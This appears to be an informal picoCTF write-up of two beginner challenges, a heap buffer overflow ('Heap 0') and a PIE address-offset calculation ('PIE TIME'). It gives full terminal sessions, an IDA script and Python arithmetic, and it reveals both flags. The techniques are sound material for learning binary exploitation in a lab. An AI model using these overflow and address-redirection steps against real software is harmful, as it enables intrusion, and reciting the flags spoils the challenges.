# Heap 0

Chat if I see overflow my strat is to keyboard smash.

```
❯ nc tethys.picoctf.net 56498


Welcome to heap0!
I put my data on the heap so it should be safe from any tampering.
Since my data isn't on the stack I'll even let you write whatever info you want to the heap, I already took care of using malloc for you.

Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data   
+-------------+----------------+
[*]   0x5f0fe17f82b0  ->   pico
+-------------+----------------+
[*]   0x5f0fe17f82d0  ->   bico
+-------------+----------------+

1. Print Heap:		(print the current state of the heap)
2. Write to buffer:	(write to your own personal block of data on the heap)
3. Print safe_var:	(I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:		(Try to print the flag, good luck)
5. Exit

Enter your choice: 4
Looks like everything is still secure!

No flage for you :(

1. Print Heap:		(print the current state of the heap)
2. Write to buffer:	(write to your own personal block of data on the heap)
3. Print safe_var:	(I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:		(Try to print the flag, good luck)
5. Exit

Enter your choice: 1
Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data   
+-------------+----------------+
[*]   0x5f0fe17f82b0  ->   pico
+-------------+----------------+
[*]   0x5f0fe17f82d0  ->   bico
+-------------+----------------+

1. Print Heap:		(print the current state of the heap)
2. Write to buffer:	(write to your own personal block of data on the heap)
3. Print safe_var:	(I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:		(Try to print the flag, good luck)
5. Exit

Enter your choice: 3


Take a look at my variable: safe_var = bico


1. Print Heap:		(print the current state of the heap)
2. Write to buffer:	(write to your own personal block of data on the heap)
3. Print safe_var:	(I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:		(Try to print the flag, good luck)
5. Exit

Enter your choice: 1
Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data   
+-------------+----------------+
[*]   0x5f0fe17f82b0  ->   pico
+-------------+----------------+
[*]   0x5f0fe17f82d0  ->   bico
+-------------+----------------+

1. Print Heap:		(print the current state of the heap)
2. Write to buffer:	(write to your own personal block of data on the heap)
3. Print safe_var:	(I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:		(Try to print the flag, good luck)
5. Exit

Enter your choice: 2
Data for buffer: afsdfdlfjklsvnurihncfwhsknafsdfdlfjklsvnurihncfwhsknafsdfdlfjklsvnurihncfwhsknafsdfdlfjklsvnurihncfwhsknafsdfdlfjklsvnurihncfwhsknafsdfdlfjklsvnurihncfwhsknafsdfdlfjklsvnurihncfwhsknafsdfdlfjklsvnurihncfwhsknafsdfdlfjklsvnurihncfwhsknafsdfdlfjklsvnurihncfwhsknafsdfdlfjklsvnurihncfwhsknafsdfdlfjklsvnurihncfwhsknafsdfdlfjklsvnurihncfwhskn

1. Print Heap:		(print the current state of the heap)
2. Write to buffer:	(write to your own personal block of data on the heap)
3. Print safe_var:	(I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:		(Try to print the flag, good luck)
5. Exit

Enter your choice: 1
Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data   
+-------------+----------------+
[*]   0x5f0fe17f82b0  ->   afsdfdlfjklsvnurihncfwhsknafsdfdlfjklsvnurihncfwhsknafsdfdlfjkls1
urihncfwhsknafsdfdlfjklsvnurihncfwhsknafsdfdlfjklsvnurihncfwhsknafsdfdlfjklsvnurihncfwhsknafsdfdlfjklsvnurihncfwhsknafsdfdlfjklsvnurihncfwhsknafsdfdlfjklsvnurihncfwhsknafsdfdlfjklsvnurihncfwhsknafsdfdlfjklsvnurihncfwhsknafsdfdlfjklsvnurihncfwhsknafsdfdlfjklsvnurihncfwhskn
+-------------+----------------+
[*]   0x5f0fe17f82d0  ->   lfjklsvnurihncfwhsknafsdfdlfjkls1
urihncfwhsknafsdfdlfjklsvnurihncfwhsknafsdfdlfjklsvnurihncfwhsknafsdfdlfjklsvnurihncfwhsknafsdfdlfjklsvnurihncfwhsknafsdfdlfjklsvnurihncfwhsknafsdfdlfjklsvnurihncfwhsknafsdfdlfjklsvnurihncfwhsknafsdfdlfjklsvnurihncfwhsknafsdfdlfjklsvnurihncfwhsknafsdfdlfjklsvnurihncfwhskn
+-------------+----------------+

1. Print Heap:		(print the current state of the heap)
2. Write to buffer:	(write to your own personal block of data on the heap)
3. Print safe_var:	(I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:		(Try to print the flag, good luck)
5. Exit

Enter your choice: 3


Take a look at my variable: safe_var = lfjklsvnurihncfwhsknafsdfdlfjkls3
urihncfwhsknafsdfdlfjklsvnurihncfwhsknafsdfdlfjklsvnurihncfwhsknafsdfdlfjklsvnurihncfwhsknafsdfdlfjklsvnurihncfwhsknafsdfdlfjklsvnurihncfwhsknafsdfdlfjklsvnurihncfwhsknafsdfdlfjklsvnurihncfwhsknafsdfdlfjklsvnurihncfwhsknafsdfdlfjklsvnurihncfwhsknafsdfdlfjklsvnurihncfwhskn


1. Print Heap:		(print the current state of the heap)
2. Write to buffer:	(write to your own personal block of data on the heap)
3. Print safe_var:	(I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:		(Try to print the flag, good luck)
5. Exit

Enter your choice: 4

YOU WIN
picoCTF{my_first_heap_overflow_c3935a08}
```

keyboard smash ftw.

# PIE TIME

Flag: `picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_ecb96bdd}`

we let chatgpt cook us some code to get the relative offsets in ida-

```idc
auto ea1, ea2, offset;

ea1 = get_name_ea_simple("main");
ea2 = get_name_ea_simple("win");

if (ea1 == BADADDR || ea2 == BADADDR) {
    Warning("One or both function names not found.");
} else {
    offset = ea1 - ea2;
    Message("func1 address: 0x%X\n", ea1);
    Message("func2 address: 0x%X\n", ea2);
    Message("Relative offset (func2 - func1): 0x%X\n", offset);
}
```

We get 0x96 here and then:

```python
main_minus_win = 0x96
main = 0x631f75d6d33d

result = main - main_minus_win
print(result,hex(result))

108986772148903 0x631f75d6d2a7
```

And now:
```
❯ nc rescued-float.picoctf.net 53158

Address of main: 0x631f75d6d33d
Enter the address to jump to, ex => 0x12345: 0x631f75d6d2a7
Your input: 631f75d6d2a7
You won!
picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_ecb96bdd}
```